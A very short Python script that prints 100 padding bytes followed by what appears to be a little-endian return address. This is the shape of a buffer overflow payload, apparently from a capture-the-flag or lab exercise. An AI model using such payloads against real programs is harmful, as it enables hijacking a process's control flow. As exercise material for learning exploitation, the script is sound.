#!/usr/bin/env python3
import sys
some_bytes = b'\x68' * 100 + b'\xc7\x07\x40'
sys.stdout.buffer.write(some_bytes)